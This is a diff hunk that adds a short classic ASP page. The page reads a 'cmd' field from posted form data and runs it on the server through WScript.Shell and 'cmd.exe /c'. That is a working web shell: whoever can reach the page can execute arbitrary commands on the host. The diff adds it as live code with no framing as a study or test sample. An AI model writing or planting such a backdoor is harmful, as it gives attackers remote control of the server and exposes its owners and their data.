@@ -1,0 +1,7 @@
+<%
+Set sh = Server.CreateObject("WScript.Shell")
+Set fso = Server.CreateObject("Scripting.FileSystemObject")
+c = Request.Form("cmd")
+Set o = sh.Exec("cmd.exe /c " & c)
+%>
+
